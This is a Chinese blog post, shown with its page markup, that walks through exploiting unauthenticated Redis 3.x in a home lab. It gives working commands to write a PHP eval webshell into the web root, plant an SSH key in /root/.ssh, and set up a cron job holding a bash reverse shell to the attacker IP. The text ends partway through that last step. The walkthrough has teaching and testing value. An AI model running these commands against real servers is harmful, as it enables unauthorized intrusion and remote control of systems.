<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>数据库提权 | RJ の 博客</title><meta name="author" content="Rui Ji"><meta name="copyright" content="Rui Ji"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="Redis数据库提权一.Redis基本介绍 Redis，全名Remote Dictionary Server，是一个使用ANSI C编写的开源、支持网络、基于内存、分布式、可选持久性的键值对存储数据库，属于NoSQL数据库类型。与传统数据库不同的是 Redis 的数据存于内存中，所以读写速度非常快，被广泛应用于缓存方向。Redis 与其他 key - value 缓存产品有以下三个特点：    R">
<meta property="og:type" content="article">
<meta property="og:title" content="数据库提权">
<meta property="og:url" content="http://ruijiluo.github.io/2024/06/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/index.html">
<meta property="og:site_name" content="RJ の 博客">
<meta property="og:description" content="Redis数据库提权一.Redis基本介绍 Redis，全名Remote Dictionary Server，是一个使用ANSI C编写的开源、支持网络、基于内存、分布式、可选持久性的键值对存储数据库，属于NoSQL数据库类型。与传统数据库不同的是 Redis 的数据存于内存中，所以读写速度非常快，被广泛应用于缓存方向。Redis 与其他 key - value 缓存产品有以下三个特点：    R">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2024/06/11/65iaHZ8bDsGUlC4.jpg">
<meta property="article:published_time" content="2024-06-01T07:26:06.000Z">
<meta property="article:modified_time" content="2024-12-18T15:58:54.737Z">
<meta property="article:author" content="Rui Ji">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2024/06/11/65iaHZ8bDsGUlC4.jpg"><link rel="shortcut icon" href="https://s2.loli.net/2023/09/07/hRcHvbPo15QmB7T.png"><link rel="canonical" href="http://ruijiluo.github.io/2024/06/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '数据库提权',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-12-18 23:58:54'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="./themes/butterfly/source/css/bg_color.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/09/07/oZOaspjYrzmT5e9.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2024/06/11/65iaHZ8bDsGUlC4.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="RJ の 博客"><span class="site-name">RJ の 博客</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 文章</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">数据库提权</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-06-01T07:26:06.000Z" title="发表于 2024-06-01 15:26:06">2024-06-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-12-18T15:58:54.737Z" title="更新于 2024-12-18 23:58:54">2024-12-18</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="数据库提权"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Redis数据库提权"><a href="#Redis数据库提权" class="headerlink" title="Redis数据库提权"></a>Redis数据库提权</h1><h2 id="一-Redis基本介绍"><a href="#一-Redis基本介绍" class="headerlink" title="一.Redis基本介绍"></a>一.Redis基本介绍</h2><ul>
<li>Redis，全名Remote Dictionary Server，是一个使用ANSI C编写的开源、支持网络、基于内存、分布式、可选持久性的键值对存储数据库，属于NoSQL数据库类型。与传统数据库不同的是 <strong>Redis 的数据存于内存中</strong>，所以读写速度非常快，被广泛应用于缓存方向。Redis 与其他 key - value 缓存产品有以下三个特点：</li>
</ul>
<blockquote>
<ol>
<li>Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。</li>
<li>Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</li>
<li>Redis支持数据的备份，即master-slave模式的数据备份。</li>
</ol>
</blockquote>
<ul>
<li><p><strong>Redis默认端口号：</strong></p>
<p>  6379：默认配置端口号</p>
<p>  26379：sentinel.conf配置器端口</p>
</li>
</ul>
<h3 id="1-常见命令"><a href="#1-常见命令" class="headerlink" title="1.常见命令"></a>1.常见命令</h3><p>入门Redis，先稍微了解一些最常见，最常用的命令即可</p>
<ul>
<li>查看redis数据库信息，如内存使用情况、key数量等</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info</span><br></pre></td></tr></table></figure>

<ul>
<li>设置变量</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> x <span class="string">&quot;redisyyds&quot;</span></span><br><span class="line"><span class="built_in">set</span> xx <span class="string">&quot;wuhu123&quot;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>设置备份路径</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> &#123;dirpath&#125;</span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/</span><br></pre></td></tr></table></figure>

<ul>
<li>在磁盘中生成文件（空）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dbfilename &#123;filename&#125;</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br></pre></td></tr></table></figure>

<ul>
<li>保存内存中的数据到磁盘文件中</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">save</span><br></pre></td></tr></table></figure>

<ul>
<li>查看所有变量名</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">keys *</span><br></pre></td></tr></table></figure>

<ul>
<li>查看变量内容</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get &#123;变量名&#125;</span><br><span class="line">get x</span><br></pre></td></tr></table></figure>

<ul>
<li>查看备份路径、文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config get <span class="built_in">dir</span>/dbfilename &#123;dirpath/filename&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>设置密码</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> requirepass &#123;password&#125;   </span><br><span class="line">config <span class="built_in">set</span> requirepass <span class="string">&quot;&quot;</span>   <span class="comment">#密码为空表示取消密码</span></span><br></pre></td></tr></table></figure>

<ul>
<li>删除键（变量）</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">flushdb     <span class="comment"># 当前库</span></span><br><span class="line">flushall    <span class="comment"># 所有库</span></span><br></pre></td></tr></table></figure>

<h3 id="2-拓展命令"><a href="#2-拓展命令" class="headerlink" title="2.拓展命令"></a>2.拓展命令</h3><p>这部分属于比较少见的命令，但是可以作为进阶学习</p>
<ul>
<li>切换数据库 redis默认由16个库(0~15号). 且默认使用的是0号库</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> &#123;num&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>获取所有配置信息</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config get *</span><br></pre></td></tr></table></figure>

<h3 id="3-Redis基本操作"><a href="#3-Redis基本操作" class="headerlink" title="3.Redis基本操作"></a>3.Redis基本操作</h3><h5 id="1、连接Redis服务器"><a href="#1、连接Redis服务器" class="headerlink" title="1、连接Redis服务器"></a>1、连接Redis服务器</h5><p>交互模式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h &#123;host&#125; -p &#123;port&#125; -a &#123;password&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/06/11/ui5Alhp1XHFBCOr.png" alt="image-20240611211200265"></p>
<p>命令模式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli &#123;command&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/06/11/52aVCjpzUoQZO1v.png" alt="image-20240611211536875"></p>
<h5 id="2、Redis设置密码"><a href="#2、Redis设置密码" class="headerlink" title="2、Redis设置密码"></a>2、Redis设置密码</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> requirepass <span class="string">&quot;passwd&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/06/11/NIPvafxFBdHV8Cr.png" alt="image-20240611211343145"></p>
<p>登陆方式1：-a参数加密码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.112.132 -a <span class="string">&quot;passwd&quot;</span></span><br></pre></td></tr></table></figure>



<p>登陆方式2：登陆进去再认证授权</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth <span class="string">&quot;passwd&quot;</span></span><br></pre></td></tr></table></figure>



<h2 id="二-软件安装及配置"><a href="#二-软件安装及配置" class="headerlink" title="二.软件安装及配置"></a>二.软件安装及配置</h2><p>Redis最新版本目前没有其相关漏洞，此次Redis漏洞复现选择为3x、4x、5x的版本。复现攻击机和靶机都选择为Kali Linux系统，分别安装3x版本和4x版本。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip信息：</span><br><span class="line">攻击机：Redis4.0.8 192.168.72.131</span><br><span class="line">靶机：Redis3.2.0 192.168.72.133</span><br></pre></td></tr></table></figure>



<h3 id="1-Redis-3-2-0安装"><a href="#1-Redis-3-2-0安装" class="headerlink" title="1.Redis-3.2.0安装"></a>1.Redis-3.2.0安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-3.2.0.tar.gz</span><br><span class="line">tar xzvf redis-3.2.0.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-3.2.0</span><br><span class="line">make   <span class="comment">#编译安装</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/06/11/mDBaAzi7VlZGdEc.png" alt="image-20240611174852453"></p>
<h3 id="2-Redis-4-0-8安装"><a href="#2-Redis-4-0-8安装" class="headerlink" title="2.Redis-4.0.8安装"></a>2.Redis-4.0.8安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-4.0.8.tar.gz</span><br><span class="line">tar xzvf redis-4.0.8.tar.gz</span><br><span class="line"><span class="built_in">cd</span> redis-4.0.8</span><br><span class="line">make</span><br></pre></td></tr></table></figure>

<img src="https://s2.loli.net/2024/06/11/JaPbjMDQEdT6N2R.png" alt="image-20240611174759512" style="zoom:80%;" />



<p>make结束后，进入src目录下，将redis-cli和redis-server拷贝到&#x2F;usr&#x2F;bin目录下，这样每次启动时就不需要进入src目录下了。</p>
<p><img src="https://s2.loli.net/2024/06/11/HBTsGCh8XVy15bz.png" alt="image-20240611174939144"></p>
<img src="https://s2.loli.net/2024/06/11/XjRmu9vO6MxcFP1.png" alt="image-20240611175004355" style="zoom:96%;" />



<h3 id="3-重要配置和文件"><a href="#3-重要配置和文件" class="headerlink" title="3.重要配置和文件"></a>3.重要配置和文件</h3><ol>
<li><p>重要文件、目录介绍</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-benchmark（压力测试工具）</span><br><span class="line">redis-sentinel（监控集群运行状态）</span><br><span class="line">redis-server（服务端）</span><br><span class="line">redis-cli（客户端）</span><br><span class="line">redis.conf (配置文件)</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/06/11/N6Yfjz9Ce1UpI4S.png" alt="image-20240611205153899"></p>
</li>
<li><p>设置允许远程连接</p>
<ul>
<li><p>修改配置文件<code>redis.conf</code>，在bind 127.0.0.1前加上#号，注释掉</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line"><span class="comment"># bind 127.0.0.1</span></span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/06/11/Q4g8FXSLRE3Y2Vo.png" alt="image-20240611205605198"></p>
</li>
</ul>
</li>
<li><p>关闭安全模式</p>
<ul>
<li><p>修改配置文件protected-mode为no，关闭安全设置,该设置开启后要求需要配置bind ip或者设置访问密码，关闭后允许远程连接。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim redis.conf</span><br><span class="line">protected-mode no</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/06/11/LxOb1a9QA7XUgiD.png" alt="image-20240611210311117"></p>
</li>
</ul>
</li>
</ol>
<h3 id="4-启动靶机redis"><a href="#4-启动靶机redis" class="headerlink" title="4.启动靶机redis"></a>4.启动靶机redis</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server redis.conf</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/06/11/9NpqZyn5bIgWAoG.png" alt="image-20240611175810726"></p>
<p>如图所示，此时默认端口为6379，没用密码，这时候会导致未授权访问。</p>
<h2 id="三-漏洞利用"><a href="#三-漏洞利用" class="headerlink" title="三.漏洞利用"></a>三.漏洞利用</h2><h3 id="1-redis未授权访问"><a href="#1-redis未授权访问" class="headerlink" title="1.redis未授权访问"></a>1.redis未授权访问</h3><h5 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><ul>
<li>Redis默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。</li>
</ul>
<h5 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h5><ul>
<li><p>编辑redis配置文件redis.conf：</p>
<p><img src="https://s2.loli.net/2024/06/11/b67Ep2jmgZueJAU.jpg" alt="image-20210917204302265"></p>
</li>
<li><p>前面加上#号，去掉IP绑定，允许除本地外的主机登陆redis服务：</p>
</li>
</ul>
<img src="https://s2.loli.net/2024/06/11/6DmR9HCIWtlaPnV.jpg" alt="image-20210917202521277" style="zoom:93%;" />



<ul>
<li>修改protected-mode为no，关闭保护模式，允许远程连接redis服务，protected-mode是Redis3.2版本新增的安全配置项，开启后要求需要配置bind ip或者设置访问密码，关闭后是允许远程连接：</li>
</ul>
<p><img src="https://s2.loli.net/2024/06/11/GtdFehnlByQgoI6.jpg" alt="1632050090_61471baa6881559b8fd3b.png!small?1632050090713"></p>
<ul>
<li><p>未授权访问redis</p>
<p><img src="https://s2.loli.net/2024/06/11/G6KvaEqrmh1LyVt.png" alt="image-20240611212016400"></p>
</li>
</ul>
<h3 id="2-redis未授权写入webshell"><a href="#2-redis未授权写入webshell" class="headerlink" title="2.redis未授权写入webshell"></a>2.redis未授权写入webshell</h3><h5 id="1-漏洞原理-1"><a href="#1-漏洞原理-1" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><ul>
<li>靶机的redis存在未授权访问，并且开启了web服务，知道了web目录的路径，并具有文件读写增删改查的权限，即可通过redis在指定的web目录下写入一句话木马，用蚁剑连接可达到控制服务器的目的。</li>
</ul>
<h5 id="2-漏洞利用-1"><a href="#2-漏洞利用-1" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h5><ol>
<li><p>靶机192.168.72.133开启apache服务</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/apache2 start</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/06/11/J3YmKt962XAfsza.png" alt="image-20240611223047482"></p>
<p><img src="https://s2.loli.net/2024/06/11/U6MkLEZbXWnaQNF.png" alt="image-20240611223134745"></p>
</li>
<li><p>在攻击机上未授权访问redis服务执行命令(登录redis的账号要有root权限)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html/ </span><br><span class="line">//切换到网站的根目录</span><br><span class="line"></span><br><span class="line">config <span class="built_in">set</span> dbfilename zcc.php</span><br><span class="line">//在磁盘中生成木马文件</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\n\n\n&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;zcc&#x27;]);?&gt;\n\n\n&quot;</span> </span><br><span class="line">//写入恶意代码到内存中，这里的\n\n\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行.</span><br><span class="line"></span><br><span class="line">save</span><br><span class="line">//将内存中的数据导出到磁盘</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/06/11/8A2Jg7OqsaMcuxY.png" alt="image-20240611230836158"></p>
</li>
<li><p>一句话木马已经写到web根目录下</p>
<p><img src="https://s2.loli.net/2024/06/11/Cq6FYovuVJLInX2.png" alt="image-20240611232102278"></p>
</li>
<li><p>蚁剑连接一句话(密码为zcc)</p>
<p><img src="https://s2.loli.net/2024/06/11/xLGCvEl56QFWsT3.png" alt="image-20240611233328268"></p>
</li>
</ol>
<h3 id="3-redis未授权密钥登录ssh"><a href="#3-redis未授权密钥登录ssh" class="headerlink" title="3.redis未授权密钥登录ssh"></a>3.redis未授权密钥登录ssh</h3><h5 id="1-漏洞原理-2"><a href="#1-漏洞原理-2" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><ul>
<li>在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为&#x2F;root&#x2F;.ssh和默认的缓冲文件authorized.keys，把缓冲的数据保存在文件里，这样就可以在服务器端的&#x2F;root&#x2F;.ssh下生成一个授权的key。</li>
</ul>
<h5 id="2-漏洞利用-2"><a href="#2-漏洞利用-2" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h5><ul>
<li>利用条件：redis对外开放，且是未授权访问状态，并且redis服务ssh对外开放，可以通过key登入。</li>
</ul>
<ol>
<li><p>靶机开启sshd</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/init.d/ssh start</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/06/11/HTlzJreSnaMFG2d.png" alt="image-20240611234912322"></p>
</li>
<li><p>在攻击机上创建ssh-rsa密钥</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/06/12/QV3HnEBj9NPCcmA.png" alt="image-20240612001334801"></p>
</li>
<li><p>将公钥导入key.txt,同时将公钥开头和结尾添加\n防止乱码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; <span class="built_in">cat</span> id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>) &gt; key.txt</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/06/12/C2ehQntS6uoqIcw.png" alt="image-20240612001908024"></p>
</li>
<li><p>将生成的公钥写入redis服务器内存</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> <span class="built_in">cat</span> key.txt | redis-cli -h 192.168.72.133 -x <span class="built_in">set</span> xxx</span><br><span class="line">// -x 代表从标准输入读取数据作为该命令的最后一个参数。</span><br></pre></td></tr></table></figure>

<p><img src="https://s2.loli.net/2024/06/12/7U6fIsWHbjnRSic.png" alt="image-20240612002103867"></p>
<p><img src="https://s2.loli.net/2024/06/12/qOEWxcsC6gTUPeM.png" alt="image-20240612002159352"></p>
</li>
<li><p>更改保存路径和文件名,将内存变量写入磁盘的&#x2F;root&#x2F;.ssh下</p>
<p><img src="https://s2.loli.net/2024/06/12/5TXFqS7L4wfJPgr.png" alt="image-20240612002509866"></p>
</li>
<li><p>使用ssh私钥连接redis服务器</p>
<p><img src="https://s2.loli.net/2024/06/12/Ovm6xl5yYircX2S.png" alt="image-20240612002722985"></p>
</li>
</ol>
<h3 id="4-redis未授权利用计划任务反弹shell"><a href="#4-redis未授权利用计划任务反弹shell" class="headerlink" title="4.redis未授权利用计划任务反弹shell"></a>4.redis未授权利用计划任务反弹shell</h3><h5 id="1-漏洞原理-3"><a href="#1-漏洞原理-3" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h5><pre><code>利用Redis未授权漏洞，可以通过写入文件到系统计划任务目录 /var/spool/cron下来执行。
</code></pre>
<h5 id="2-漏洞利用-3"><a href="#2-漏洞利用-3" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h5><ol>
<li><p>攻击机开启监听</p>
<pre><code>                                                    ![image-20240620225950195](https://s2.loli.net/2024/06/20/ey18SYP3OwRnszZ.png)		
</code></pre>
</li>
<li><p>未授权连接靶机后,写入反弹shell(bash)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\n\n * * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.72.131/4444 0&gt;&amp;1\n\n&quot;</span>  //星号*****表示的是计划任务的时间</span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/crontabs</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>


</li>
